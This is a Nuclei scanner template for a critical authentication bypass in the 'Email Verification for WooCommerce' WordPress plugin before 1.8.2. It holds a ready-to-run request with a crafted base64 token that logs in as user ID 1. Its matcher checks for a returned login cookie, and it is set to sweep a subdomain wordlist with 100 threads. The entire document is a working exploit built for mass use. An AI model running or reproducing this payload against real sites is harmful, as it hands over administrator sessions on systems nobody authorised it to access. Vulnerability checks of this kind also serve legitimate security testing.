id: wp-woocommerce-email-verification 1
info:
  name: wordpress-emails-verification-for-woocommerce
  author: random_robbie
  severity: critical
  tags: wordpress,wp-plugin
  description: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass
  reference: https://wpvulndb.com/vulnerabilities/10318
  # GDPR plugin may give a false positive so double check headers

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0= HTTP/1.1
        Host: {{Subdomains}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "wordpress_logged_in"
        part: header

      - type: status
        status:
          - 401
          - 403
        negative: true
